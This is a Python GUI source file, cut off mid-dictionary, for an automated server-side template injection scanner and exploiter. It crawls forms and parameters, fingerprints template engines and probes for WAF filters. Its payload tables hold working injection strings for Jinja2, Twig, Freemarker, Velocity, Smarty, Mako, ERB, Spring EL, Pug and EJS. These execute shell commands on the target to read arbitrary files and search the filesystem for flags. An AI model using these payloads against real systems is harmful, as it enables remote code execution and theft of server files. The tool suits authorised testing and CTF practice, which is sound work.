import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import requests
import urllib.parse
import urllib3
import threading
import json
import time
import re
import csv
import html
import difflib
from html.parser import HTMLParser
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._current_form = None
        self._in_form = False

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'form':
            self._in_form = True
            self._current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'GET').upper(),
                'inputs': []
            }
        elif tag in ('input', 'textarea', 'select', 'button') and self._in_form:
            name = attrs_dict.get('name', '')
            if name and name not in self._current_form['inputs']:
                self._current_form['inputs'].append(name)

    def handle_endtag(self, tag):
        if tag == 'form' and self._in_form:
            self._in_form = False
            self.forms.append(self._current_form)
            self._current_form = None


class SSTIEngine:
    """基於封包特徵分析的智能 SSTI 檢測引擎"""

    def __init__(self, proxy=None, timeout=15, verify_ssl=False):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.timeout = timeout
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.reset_state()

    def reset_state(self):
        self.detected_engine = None
        self.detected_confidence = 0
        self.filters = {}
        self.scanning = True
        self.discovered_injection_points = []
        self.baseline_response = {}  # 儲存基準回應
        self.findings = []

    # ==================== 核心：封包檢測邏輯 ====================

    def _get_baseline(self, point):
        """取得該注入點的基準回應（用於差異比對）"""
        ptype, url, method, data, desc = point
        # 發送無害字串作為基準
        baseline_payload = "SSTI_BASELINE_12345"
        text, status, elapsed = self.send_to_point(point, baseline_payload)
        return {
            'text': text,
            'status': status,
            'length': len(text) if text else 0,
            'payload': baseline_payload
        }

    def _response_diff(self, baseline, probe_text):
        """計算回應差異：回傳 (diff_ratio, is_math_result, extracted_number)"""
        if not baseline['text'] or not probe_text:
            return 0.0, False, None

        # 1. 文字相似度
        diff_ratio = difflib.SequenceMatcher(None, baseline['text'], probe_text).ratio()

        # 2. 嘗試提取數學運算結果
        extracted = None
        # 找被渲染的數字結果（49, 7777777 等）
        numbers = re.findall(r'\b(\d{2,})\b', probe_text)
        if numbers:
            extracted = numbers[0]

        # 3. 判斷是否為數學運算結果（回應中出現預期數字，且基準中沒有）
        is_math = False
        if extracted and extracted not in baseline['text']:
            is_math = True

        return diff_ratio, is_math, extracted

    def _math_probe(self, point, expr_template, expected=None, expected_re=None):
        """
        用 token marker 包裹數學/物件探針的運算結果來驗證引擎，取代直接在整頁回應裡
        搜尋子字串（例如找「49」）——真實頁面常含 CSRF token、時間戳、CDN 版號等雜訊，
        剛好出現一個「49」子字串的機率不低，會讓完全沒吃到 payload 語法的引擎被誤判成
        看似匹配。這裡要求 expr_template 是一個「該引擎語法下的字串串接」表達式，把
        SSTI_<token>_ 與 _END 常數字串跟運算結果接在一起（例如 Jinja2 用
        "SSTI_{{TOKEN}}_"~(7*7)~"_END"，Java 系用 "SSTI_{{TOKEN}}_"+(7*7)+"_END"），
        回應解析時只信任 token 定位到的內容，不吃頁面其他地方的巧合數字。

        expected: 擷取到的內容需完全等於此字串才算命中。
        expected_re: 擷取到的內容需完全匹配此正則（用 fullmatch）才算命中，用於
        random() 這種數值不固定但格式固定的場景。
        兩者至少提供一個；都提供時任一滿足即算命中。

        回傳 (matched: bool, status, extracted_between_markers_or_None)
        """
        token = self._make_token()
        payload = expr_template.replace('{{TOKEN}}', token)
        text, status, _ = self.send_to_point(point, payload)
        extracted = self._extract_by_token(text, token) if status == 200 else None
        if extracted is None:
            return False, status, None
        matched = False
        if expected is not None and extracted == expected:
            matched = True
        if not matched and expected_re is not None and re.fullmatch(expected_re, extracted):
            matched = True
        return matched, status, extracted

    def _detect_by_error(self, text, status):
        """從錯誤訊息/回應中識別模板引擎（if-else 鏈）"""
        if not text or status == 200:
            return None, 0

        text_lower = text.lower()

        # === Jinja2 / Flask ===
        if any(k in text_lower for k in ['jinja2', 'jinja2.exceptions', 'undefinederror', 'templatenotfound']):
            if 'jinja2.exceptions.templatenotfound' in text_lower:
                return 'Jinja2', 10
            return 'Jinja2', 8

        # === Django ===
        if any(k in text_lower for k in ['django.template', 'templatesyntaxerror', 'django.core.exceptions']):
            return 'Django', 9

        # === Twig / Symfony ===
        if any(k in text_lower for k in ['twig\\error', 'twig_exception', 'syntax error, unexpected']):
            if 'twig' in text_lower:
                return 'Twig', 9
            return 'Twig', 7

        # === Freemarker ===
        if any(k in text_lower for k in ['freemarker.core', 'freemarker.template', 'parseexception']):
            return 'Freemarker', 9

        # === Velocity ===
        if any(k in text_lower for k in ['velocity', 'org.apache.velocity']):
            return 'Velocity', 8

        # === Thymeleaf ===
        if any(k in text_lower for k in ['thymeleaf', 'templateprocessingexception']):
            return 'Thymeleaf', 8

        # === Handlebars ===
        if any(k in text_lower for k in ['handlebars', 'com.github.jknack.handlebars']):
            return 'Handlebars', 8

        # === Mako ===
        if any(k in text_lower for k in ['mako.runtime', 'mako.exceptions', 'mako.template']):
            return 'Mako', 8

        # === Smarty ===
        if any(k in text_lower for k in ['smarty', 'smarty_exception']):
            return 'Smarty', 7

        # === Ruby ERB ===
        if any(k in text_lower for k in ['syntaxerror', 'unexpected tstring_beg', 'unexpected keyword_end']):
            if '<%' in text or 'erb' in text_lower:
                return 'Ruby_ERB', 6

        # === Spring EL ===
        if any(k in text_lower for k in ['spel', 'springframework.expression']):
            return 'Spring_EL', 8

        # === Pebble ===
        if 'pebble' in text_lower:
            return 'Pebble', 7

        # === Nunjucks / EJS / Pug（Node.js 類）===
        if 'nunjucks' in text_lower:
            return 'Nunjucks', 7
        if 'ejs' in text_lower:
            return 'EJS', 7
        if 'pug' in text_lower or 'jade' in text_lower:
            return 'Pug', 7

        return None, 0

    # 每個引擎語法下「把常數字串與運算式串接輸出」的模板，用來把運算結果精確包在
    # SSTI_<token>_START_ 與 SSTI_<token>_END_ 之間（{{TOKEN}} 於送出前被替換成隨機
    # token，{{EXPR}} 於送出前被替換成該次要驗證的運算式原始碼，例如 "7*7"）。
    # 用字串串接而非「marker 文字 + 裸露表達式」是關鍵：後者只是把常數 marker 跟
    # 表達式擺在一起，若該引擎其實看不懂這段語法、原樣輸出，marker 仍會出現在回應
    # 裡（因為它本來就是常數文字），造成誤判為命中；用引擎自己的串接運算子把
    # marker 跟表達式接成同一個字串再輸出，只有語法真的被該引擎解析執行時，
    # 運算結果才會被夾在 marker 之間。
    _MATH_PROBE_TEMPLATES = {
        # Jinja2 / Twig / Liquid 系：{{ }} 插值，用 Python/Twig 的 + 字串串接
        'jinja_concat': 'SSTI_{{TOKEN}}_START_{{ "" }}{{ ({{EXPR}}) }}SSTI_{{TOKEN}}_END_',
        # Java EL 系（Spring EL / Thymeleaf `${}`）：用 + 字串串接
        'dollar_concat': '${"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}',
        # Thymeleaf 內聯運算式 [[${}]]
        'thymeleaf_concat': '[[${"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}]]',
        # Freemarker：字串用 + 串接
        'freemarker_concat': '${"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}',
        # ERB / EJS：<%= %> 內為 Ruby/JS 運算式，用 + 串接
        'erb_concat': '<%= "SSTI_{{TOKEN}}_START_" + ({{EXPR}}).to_s + "SSTI_{{TOKEN}}_END_" %>',
        'ejs_concat': '<%= "SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_" %>',
        # Smarty：直接把常數字串與運算式相鄰輸出（Smarty 的 {} 區塊本身就是輸出區）
        'smarty_concat': '{"SSTI_{{TOKEN}}_START_"}{ {{EXPR}} }{"SSTI_{{TOKEN}}_END_"}',
        # Pug 內聯 #{}：JS 運算式，用 + 串接
        'pug_concat': '#{"SSTI_{{TOKEN}}_START_" + ({{EXPR}}) + "SSTI_{{TOKEN}}_END_"}',
    }

    def _math_probe_concat(self, point, template_key, expr, expected=None, expected_re=None):
        """
        以 _MATH_PROBE_TEMPLATES 裡對應引擎語法的字串串接模板包裹 expr 送出，
        取代直接拼接 marker 文字與表達式（那樣即使引擎看不懂語法、原樣輸出，
        marker 仍會出現在回應裡而造成誤判）。
        """
        template = self._MATH_PROBE_TEMPLATES[template_key]
        expr_template = template.replace('{{EXPR}}', expr)
        return self._math_probe(point, expr_template, expected=expected, expected_re=expected_re)

    def _detect_by_math(self, point, baseline):
        """
        數學運算探測：每條探針都用該引擎語法的字串串接模板把運算結果包在 token
        marker 之間再擷取比對（見 _math_probe_concat），不再直接對整頁回應做子字串
        搜尋——真實頁面常見的 CSRF token/時間戳/CDN 版號等雜訊很容易巧合含有「49」
        這類短數字，若不用 token 定界，會把完全不吃該語法的引擎誤判為命中。
        """
        # 探針 1: Jinja2/Twig 語法 7*7 應該得到 49
        matched1, status1, ext1 = self._math_probe_concat(
            point, 'jinja_concat', '7*7', expected='49')

        # 探針 2: 7*'7' 在 Jinja2/Twig 會得到 7777777（字串重複），其他引擎可能報錯或得 49
        matched2, status2, ext2 = self._math_probe_concat(
            point, 'jinja_concat', "7*'7'", expected='7777777')

        # ==================== if-else 判斷邏輯 ====================

        # 條件 A: 7*7 得到 49，且 7*'7' 得到 7777777 → Jinja2/Twig 高信心度
        if matched1 and matched2:
            # 進一步區分 Jinja2 vs Twig：Jinja2 的 config 物件會帶出 Config/ImmutableDict 等關鍵字，
            # 一樣包在 token 之間比對，避免頁面其他地方巧合含有這些字樣
            m_jinja, _, ext_j = self._math_probe_concat(
                point, 'jinja_concat', 'config',
                expected_re=r'.*(Config|ImmutableDict|jinja|JSON_AS_ASCII).*')
            if m_jinja:
                return 'Jinja2', 10, "數學驗證: 49+7777777, config物件匹配"
            else:
                return 'Twig', 9, "數學驗證: 49+7777777"

        # 條件 B: 7*7 得到 49，但 7*'7' 未得到 7777777（Django 不支援字串乘法、Spring EL、Thymeleaf 等）
        if matched1:
            # Django 測試：{% debug %} 標籤本身不是可串接的表達式，會直接把大量除錯資訊
            # 插入輸出流，故不用串接模板，而是直接在前後加上字面 marker 常數文字，
            # 靠標籤語法本身是否真的被 Django 解析執行來判斷（未知語法會被當純文字保留，
            # 但除錯資訊只有真正的 Django 才吐得出來，用內容關鍵字而非單純 marker 存在來判定）
            token_dj = self._make_token()
            payload_dj = f'SSTI_{token_dj}_START_{{% debug %}}SSTI_{token_dj}_END_'
            text_dj, status_dj_code, _ = self.send_to_point(point, payload_dj)
            ext_dj = self._extract_by_token(text_dj, token_dj) if status_dj_code == 200 else None
            if ext_dj and re.search(r'(django|WSGIRequest|settings)', ext_dj):
                return 'Django', 9, "數學驗證: 49, debug標籤匹配"

            # Spring EL 測試：必須用 ${..} 語法重新驗證，不能沿用探針1（那是 {{..}} 語法的結果，
            # 不代表 ${..} 這個完全不同語法也真的被評估——對不懂 $ 語法的引擎，${7*7} 只會原樣輸出）
            m_sp, _, ext_sp = self._math_probe_concat(
                point, 'dollar_concat', '7*7', expected='49')
            if m_sp:
                # 再測 T(java.lang.Math).random()，要求輸出符合 0.xxx 隨機小數格式，
                # 而非籠統比對 '0.' 這種任何含 CSS/JS 的網頁都很可能出現的子字串
                m_sp2, _, ext_sp2 = self._math_probe_concat(
                    point, 'dollar_concat', 'T(java.lang.Math).random()+""',
                    expected_re=r'0\.\d{3,}.*')
                if m_sp2:
                    return 'Spring_EL', 9, "數學驗證: 49+random()匹配"

            # Thymeleaf 測試：同樣要用 [[${..}]] 語法重新驗證，不能沿用探針1的結果
            m_th, _, ext_th = self._math_probe_concat(
                point, 'thymeleaf_concat', '7*7', expected='49')
            if m_th:
                return 'Thymeleaf', 8, "數學驗證: 49, thymeleaf語法匹配"

            # 通用：有數學運算但無法精確識別
            return 'Jinja2', 6, "數學驗證: 49 (低信心度，可能為Jinja2變體)"

        # 條件 C: ${7*7} 得到 49 → Java 系（Freemarker/Velocity/Spring EL）
        matched_d, status_d, ext_d = self._math_probe_concat(
            point, 'dollar_concat', '7*7', expected='49')
        if matched_d:
            # Freemarker 測試：${.version} 非串接運算式，直接用固定 marker 包裹判斷內容關鍵字
            token_fm = self._make_token()
            payload_fm = f'SSTI_{token_fm}_START_${{.version}}SSTI_{token_fm}_END_'
            text_fm, status_fm_code, _ = self.send_to_point(point, payload_fm)
            ext_fm = self._extract_by_token(text_fm, token_fm) if status_fm_code == 200 else None
            if ext_fm and 'FreeMarker' in ext_fm:
                return 'Freemarker', 9, "數學驗證: ${7*7}=49, version匹配"

            # Velocity 測試：#set($x=7*7)${x} 是敘述+插值，非單一串接運算式，
            # 直接用固定 marker 前後包裹，判斷運算結果 49 是否出現在 marker 之間
            token_vel = self._make_token()
            payload_vel = f'SSTI_{token_vel}_START_#set($x=7*7)${{x}}SSTI_{token_vel}_END_'
            text_vel, status_vel_code, _ = self.send_to_point(point, payload_vel)
            ext_vel = self._extract_by_token(text_vel, token_vel) if status_vel_code == 200 else None
            if ext_vel and '49' in ext_vel:
                return 'Velocity', 8, "數學驗證: #set語法匹配"

            return 'Spring_EL', 6, "數學驗證: ${7*7}=49 (低信心度)"

        # 條件 D: <%= 7*7 %> 得到 49 → ERB/EJS
        m_erb, _, ext_erb = self._math_probe_concat(
            point, 'erb_concat', '7*7', expected='49')
        if m_erb:
            # 區分 Ruby ERB vs EJS：ERB 的字串乘法 '7'*7 會重複字串成 7777777
            m_ruby, _, ext_ruby = self._math_probe_concat(
                point, 'erb_concat', "'7'*7", expected='7777777')
            if m_ruby:
                return 'Ruby_ERB', 9, "數學驗證: <%= %>=49, 字串重複匹配"
            return 'EJS', 7, "數學驗證: <%= %>=49"

        # 條件 E: {{ 7 | times: 7 }} → Liquid（filter 語法非可串接運算式，用固定 marker 包裹）
        token_liq = self._make_token()
        payload_liq = f'SSTI_{token_liq}_START_{{{{ 7 | times: 7 }}}}SSTI_{token_liq}_END_'
        text_liq, status_liq_code, _ = self.send_to_point(point, payload_liq)
        ext_liq = self._extract_by_token(text_liq, token_liq) if status_liq_code == 200 else None
        if ext_liq and '49' in ext_liq:
            return 'Liquid', 8, "數學驗證: times filter匹配"

        # 條件 F: {7*7} → Smarty
        m_sm, _, ext_sm = self._math_probe_concat(
            point, 'smarty_concat', '7*7', expected='49')
        if m_sm:
            token_sm2 = self._make_token()
            payload_sm2 = f'SSTI_{token_sm2}_START_{{$smarty.version}}SSTI_{token_sm2}_END_'
            text_sm2, status_sm2_code, _ = self.send_to_point(point, payload_sm2)
            ext_sm2 = self._extract_by_token(text_sm2, token_sm2) if status_sm2_code == 200 else None
            if ext_sm2 and 'Smarty' in ext_sm2:
                return 'Smarty', 9, "數學驗證: {7*7}=49, version匹配"
            return 'Smarty', 7, "數學驗證: {7*7}=49"

        # 條件 G: #{7*7} → Pug
        m_pug, _, ext_pug = self._math_probe_concat(
            point, 'pug_concat', '7*7', expected='49')
        if m_pug:
            return 'Pug', 7, "數學驗證: #{7*7}=49"

        # 條件 H: 無法數學驗證，但回應狀態碼與基準不同 → 可能是盲注或過濾
        if status1 != baseline['status']:
            return 'UNKNOWN', 3, f"回應異常: status={status1}, 可能為盲注或WAF攔截"

        return None, 0, "無法識別"

    def fingerprint_all(self, points, log_cb):
        """智能指紋識別：結合錯誤訊息 + 數學運算 + 回應差異"""
        best_engine = None
        best_conf = 0
        best_point = None
        best_reason = ""

        for point in points:
            if not self.scanning:
                break

            ptype, url, method, data, desc = point
            log_cb(f"[*] 在 {desc} 進行智能指紋識別...")

            # Step 1: 取得基準回應
            baseline = self._get_baseline(point)
            if baseline['status'] == -1:  # Timeout
                log_cb("    [-] 基準請求超時，跳過")
                continue

            # Step 2: 先嘗試數學運算檢測（最可靠）
            engine, conf, reason = self._detect_by_math(point, baseline)
            if engine and conf >= 6:
                log_cb(f"    [+] 數學驗證命中: {engine} (信心度 {conf})")
                if conf > best_conf:
                    best_engine = engine
                    best_conf = conf
                    best_point = point
                    best_reason = reason
                # 不在此提早結束整體掃描：即使這個點已經高信心度，仍繼續測完其餘
                # 注入點（例如同一表單的其他欄位），避免因欄位在 HTML 中排序在前
                # 就被優先鎖定，導致真正該用的欄位從未被測試到。

            # Step 3: 發送故意錯誤語法，觸發模板錯誤
            error_payloads = [
                "{{7*}}",      # Jinja2/Twig/Django
                "${7*}",       # Spring EL/Freemarker
                "<%= 7* %>",   # ERB/EJS
                "{7*}",        # Smarty
                "#{7*}",       # Pug
            ]
            for err_pl in error_payloads:
                if not self.scanning:
                    break
                text, status, _ = self.send_to_point(point, err_pl)
                err_engine, err_conf = self._detect_by_error(text, status)
                if err_engine and err_conf >= 7:
                    log_cb(f"    [+] 錯誤訊息命中: {err_engine} (信心度 {err_conf})")
                    if err_conf > best_conf:
                        best_engine = err_engine
                        best_conf = err_conf
                        best_point = point
                        best_reason = f"錯誤訊息識別: {err_pl}"
                    if err_conf >= 9:
                        break

            # Step 4: 如果都沒中，嘗試回應長度異常檢測（盲注線索）
            if not best_engine:
                probe_time = "{{7*7}}{{7*7}}{{7*7}}{{7*7}}{{7*7}}"
                text_t, status_t, elapsed_t = self.send_to_point(point, probe_time)
                # 如果回應明顯變長（重複渲染），可能有 SSTI
                if text_t and len(text_t) > baseline['length'] * 1.5 and status_t == 200:
                    log_cb("    [!] 回應長度異常增長，可能存在 SSTI (待盲注確認)")
                    if best_conf < 2:
                        best_conf = 2
                        best_point = point
                        best_reason = "回應長度異常"

        if best_engine:
            log_cb(f"[+] 最終識別: {best_engine} (信心度 {best_conf}) @ {best_point[4]}")
            log_cb(f"    原因: {best_reason}")

        return best_engine, best_conf, best_point, [best_reason] if best_reason else []

    # ==================== 以下為原有方法（保持不變或微調）====================

    @staticmethod
    def _inject_get_params(url, payload):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if qs:
            injected_urls = []
            for key in qs:
                new_qs = dict(qs)
                new_qs[key] = [payload]
                new_query = urllib.parse.urlencode(new_qs, doseq=True)
                injected_urls.append(parsed._replace(query=new_query).geturl())
            return injected_urls
        else:
            common_params = ['q', 'search', 'name', 'input', 'text', 'query',
                             'msg', 'message', 'data', 'template', 'page', 'id']
            return [f"{url}?{p}={urllib.parse.quote(payload)}" for p in common_params]

    def send(self, url, method='GET', data=None, headers=None, cookies=None, payload='', timeout=None):
        to = timeout or self.timeout
        try:
            h = dict(self.session.headers)
            if headers:
                h.update(headers)
            if method.upper() == 'GET':
                test_urls = self._inject_get_params(url, payload)
                best_text, best_status, best_elapsed = None, 0, 0
                for test_url in test_urls:
                    t0 = time.time()
                    r = self.session.get(test_url, headers=h, cookies=cookies, timeout=to, allow_redirects=True)
                    elapsed = time.time() - t0
                    if r.status_code == 200:
                        best_text, best_status, best_elapsed = r.text, r.status_code, elapsed
                        break
                    elif best_status == 0:
                        best_text, best_status, best_elapsed = r.text, r.status_code, elapsed
                return (best_text or ''), best_status, best_elapsed
            elif method.upper() == 'POST':
                body = None
                json_data = None
                if data and '{{PAYLOAD}}' in data:
                    body = data.replace('{{PAYLOAD}}', payload)
                    try:
                        json_data = json.loads(body)
                        body = None
                    except:
                        pass
                elif data:
                    body = data
                t0 = time.time()
                if json_data:
                    r = self.session.post(url, json=json_data, headers=h, cookies=cookies, timeout=to, allow_redirects=True)
                elif body:
                    try:
                        body_dict = dict(urllib.parse.parse_qsl(body, keep_blank_values=True))
                        r = self.session.post(url, data=body_dict, headers=h, cookies=cookies, timeout=to, allow_redirects=True)
                    except Exception:
                        r = self.session.post(url, data=body, headers=h, cookies=cookies, timeout=to, allow_redirects=True)
                else:
                    r = self.session.post(url, data=payload, headers=h, cookies=cookies, timeout=to, allow_redirects=True)
                elapsed = time.time() - t0
            else:
                return None, 0, 0
            return r.text, r.status_code, elapsed
        except requests.exceptions.Timeout:
            return 'TIMEOUT', -1, to
        except Exception as e:
            return f'ERROR:{e}', -2, 0

    def auto_discover(self, url, log_cb):
        points = []
        base_url = url.split('?')[0]
        log_cb("[*] 自動發現注入點...")
        points.append(('get_param', base_url, 'GET', None, 'URL查詢參數'))
        try:
            r = self.session.get(base_url, timeout=self.timeout, allow_redirects=True)
            log_cb(f"[*] 頁面請求狀態碼: {r.status_code} (最終網址: {r.url})")
            if r.status_code == 200:
                parser = FormParser()
                parser.feed(r.text)
                log_cb(f"[*] 解析到 {len(parser.forms)} 個 <form>")
                for form in parser.forms:
                    action = form['action']
                    if action.startswith('http'):
                        form_url = action
                    else:
                        from urllib.parse import urljoin
                        form_url = urljoin(r.url, action)
                    method = form['method']
                    log_cb(f"    表單 action={form_url} method={method} inputs={form['inputs']}")
                    if not form['inputs']:
                        log_cb("    [!] 此表單未解析到任何具名 input/textarea/select，略過")
                    for inp in form['inputs']:
                        if method == 'GET':
                            points.append(('form_get', form_url, 'GET', inp, f'表單GET參數: {inp}'))
                        else:
                            # 其餘欄位補上無害佔位值，確保送出完整表單，避免因缺欄位被伺服器擋掉/驗證失敗
                            body_parts = [
                                (other + '={{PAYLOAD}}') if other == inp else f'{other}=test'
                                for other in form['inputs']
                            ]
                            body_template = '&'.join(body_parts)
                            points.append(('form_post', form_url, 'POST', body_template, f'表單POST參數: {inp}'))
                if not parser.forms:
                    log_cb("[*] 頁面無表單，嘗試通用POST注入")
                    points.append(('generic_post', base_url, 'POST', 'input={{PAYLOAD}}', '通用POST參數'))
            else:
                log_cb("[-] 頁面回應非 200，跳過表單解析，嘗試通用POST注入")
                points.append(('generic_post', base_url, 'POST', 'input={{PAYLOAD}}', '通用POST參數'))
        except Exception as e:
            log_cb(f"[-] 頁面解析失敗: {e}")
            points.append(('generic_post', base_url, 'POST', 'input={{PAYLOAD}}', '通用POST參數'))
        points.append(('header', base_url, 'GET', None, 'Header: User-Agent'))
        points.append(('cookie', base_url, 'GET', None, 'Cookie'))
        self.discovered_injection_points = points
        log_cb(f"[*] 發現 {len(points)} 個潛在注入點")
        for p in points:
            log_cb(f"    → {p[4]} ({p[1]}) [{p[2]}]")
        return points

    def send_to_point(self, point, payload):
        ptype, url, method, data, desc = point
        try:
            if ptype == 'get_param':
                best_text, best_status, best_elapsed = '', 0, 0
                for test_url in self._inject_get_params(url, payload):
                    t0 = time.time()
                    r = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                    elapsed = time.time() - t0
                    if r.status_code == 200:
                        best_text, best_status, best_elapsed = r.text, r.status_code, elapsed
                        break
                    elif best_status == 0:
                        best_text, best_status, best_elapsed = r.text, r.status_code, elapsed
                return best_text, best_status, best_elapsed
            elif ptype == 'form_get':
                # data 帶有表單解析出的真實欄位名稱，直接注入該欄位，不用猜測清單
                field_name = data or 'q'
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[field_name] = [payload]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                t0 = time.time()
                r = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                return r.text, r.status_code, time.time() - t0
            elif ptype in ('form_post', 'generic_post'):
                # data 是 "field1=val1&field2={{PAYLOAD}}" 樣式的模板；解析成 dict 後再代入，
                # 讓 requests 負責 application/x-www-form-urlencoded 編碼與 Content-Type，
                # 避免直接 POST 原始字串導致缺少 Content-Type 而被伺服器忽略表單內容
                template = data if data else 'input={{PAYLOAD}}'
                form_fields = dict(urllib.parse.parse_qsl(template, keep_blank_values=True))
                form_fields = {k: (payload if v == '{{PAYLOAD}}' else v) for k, v in form_fields.items()}
                t0 = time.time()
                r = self.session.post(url, data=form_fields, timeout=self.timeout, allow_redirects=True)
                return r.text, r.status_code, time.time() - t0
            elif ptype == 'header':
                h = {'User-Agent': payload}
                t0 = time.time()
                r = self.session.get(url, headers=h, timeout=self.timeout, allow_redirects=True)
                return r.text, r.status_code, time.time() - t0
            elif ptype == 'cookie':
                c = {'ssti_test': payload}
                t0 = time.time()
                r = self.session.get(url, cookies=c, timeout=self.timeout, allow_redirects=True)
                return r.text, r.status_code, time.time() - t0
            else:
                return self.send(url, method, data, None, None, payload)
        except requests.exceptions.Timeout:
            return 'TIMEOUT', -1, self.timeout
        except Exception as e:
            return f'ERROR:{e}', -2, 0

    def detect_filters(self, point, engine):
        f = {}
        tests = [
            ('dot', '{{"".__class__}}', ['class']),
            ('bracket', '{{""["__class__"]}}', ['class']),
            ('os_keyword', '{{os}}', []),
            ('class_keyword', '{{class}}', []),
            ('popen_keyword', '{{popen}}', []),
            ('read_keyword', '{{read}}', []),
            ('request_obj', '{{request}}', ['request']),
            ('config_obj', '{{config}}', ['config']),
            ('lipsum_obj', '{{lipsum}}', ['lipsum']),
            ('url_for_obj', '{{url_for}}', ['url_for']),
        ]
        for key, payload, expect in tests:
            text, status, _ = self.send_to_point(point, payload)
            if key == 'dot':
                f['dot'] = not (status == 200 and any(e in text for e in expect))
                f['underscore'] = f['dot']
            elif key == 'bracket':
                f['bracket'] = not (status == 200 and any(e in text for e in expect))
            elif key in ('os_keyword', 'class_keyword', 'popen_keyword', 'read_keyword'):
                f[key] = status != 200 or 'blocked' in text.lower() or 'waf' in text.lower()
            else:
                f[key] = status != 200 or not any(e.lower() in text.lower() for e in expect)
        self.filters = f
        level = sum(1 for v in f.values() if v)
        return f, level

    # ==================== 讀檔 payload（僅讀取，不提供任意命令執行）====================

    # 每個引擎對應「一組」候選 payload（依序嘗試），而非單一字串——
    # 不同目標環境可用的 gadget 不一定相同（例如 lipsum 依賴 os 已被目標app import，
    # request.application 則不依賴，但不是所有 Flask/Werkzeug 版本都有這個屬性路徑），
    # 單一 gadget 打不到不代表沒有 SSTI，所以逐一嘗試、成功就用該條。
    #
    # 每條 payload 都用 {{TOKEN}} 佔位符把指令輸出包在唯一標記之間
    # （SSTI_<token>_START_...輸出...SSTI_<token>_END_），讓回應解析階段可以直接用
    # 正則在 marker 之間擷取，不必再靠 difflib 逐行比對基準頁面去猜哪些是新增內容
    # ——頁面本身若含時間戳/隨機廣告等雜訊，逐行 diff 容易誤判或漏抓，加了 marker 之後
    # 擷取不到就是真的失敗，不會有「抓錯行」的模糊地帶。
    FILE_READ_PAYLOADS = {
        'Jinja2': [
            "{{lipsum.__globals__['os'].popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
            "{{cycler.__init__.__globals__.os.popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
            "{{joiner.__init__.__globals__.os.popen('echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_').read()}}",
        ],
        'Twig': [
            '{{["echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]|filter("system")}}',
            '{{["echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]|filter("passthru")}}',
        ],
        'Freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo SSTI_{{TOKEN}}_START_")}${ex("cat {{PATH}}")}${ex("echo SSTI_{{TOKEN}}_END_")}',
        ],
        'Velocity': [
            '#set($e="e")#set($rt=$e.getClass().forName("java.lang.Runtime"))#set($p=$rt.getMethod("getRuntime",null).invoke(null,null).exec(["/bin/sh","-c","echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_"]))#set($out=$p.getInputStream())#foreach($i in [1..4000])$out.read()#end',
        ],
        'Smarty': [
            '{php}echo "SSTI_{{TOKEN}}_START_"; echo file_get_contents("{{PATH}}"); echo "SSTI_{{TOKEN}}_END_";{/php}',
        ],
        'Mako': [
            '${self.module.runtime.util.os.popen("echo SSTI_{{TOKEN}}_START_; cat {{PATH}}; echo SSTI_{{TOKEN}}_END_").read()}',
        ],
        'Ruby_ERB': [
            '<%= "SSTI_{{TOKEN}}_START_" + (File.read("{{PATH}}") rescue `cat {{PATH}}`) + "SSTI_{{TOKEN}}_END_" %>',
        ],
        'Spring_EL': [
            '${"SSTI_{{TOKEN}}_START_" + T(java.nio.file.Files).readString(T(java.nio.file.Paths).get("{{PATH}}")) + "SSTI_{{TOKEN}}_END_"}',
        ],
        'Thymeleaf': [
            '[[${"SSTI_{{TOKEN}}_START_" + T(java.nio.file.Files).readString(T(java.nio.file.Paths).get("{{PATH}}")) + "SSTI_{{TOKEN}}_END_"}]]',
        ],
        'Pug': [
            '- var x = "SSTI_{{TOKEN}}_START_" + global.process.mainModule.require("fs").readFileSync("{{PATH}}","utf8") + "SSTI_{{TOKEN}}_END_"\n= x',
        ],
        'EJS': [
            '<%= "SSTI_{{TOKEN}}_START_" + global.process.mainModule.require("fs").readFileSync("{{PATH}}","utf8") + "SSTI_{{TOKEN}}_END_" %>',
        ],
    }

    FLAG_SEARCH_COMMANDS = {
        'Jinja2': [
            "{{lipsum.__globals__['os'].popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
